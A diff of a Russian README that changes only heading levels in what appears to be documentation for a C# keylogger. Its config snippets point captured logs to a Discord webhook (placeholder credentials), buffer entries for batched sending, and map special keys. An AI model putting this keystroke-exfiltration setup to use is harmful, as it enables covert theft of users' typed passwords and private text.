@@ -76,13 +76,13 @@
   
 ## ⚙️ Конфигурация
 
-# Webhook настройка
+## Webhook настройка
 ```
 private static string discordWebhookUrl = 
     "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
 ```
 
-# Настройка буферизации
+## Настройка буферизации
 ```
 // Отправка при накоплении 10 записей
 if (logBuffer.Count >= 10)
@@ -94,7 +94,7 @@ if (logBuffer.Count >= 10)
 if (DateTime.Now.Minute % 5 == 0)
 ```
 
-# Специальные клавиши
+## Специальные клавиши
 ```
 private static Dictionary<int, string> specialKeys = new Dictionary<int, string>
 {
@@ -105,7 +105,7 @@ private static Dictionary<int, string> specialKeys = new Dictionary<int, string>
 ```
 
 ## 🔧 Компиляция
-# Через Visual Studio
+## Через Visual Studio
 - Откройте проект в **Visual Studio**
 - Выберите конфигурацию **Release**
 - Build → Build Solution **(Ctrl+Shift+B)**
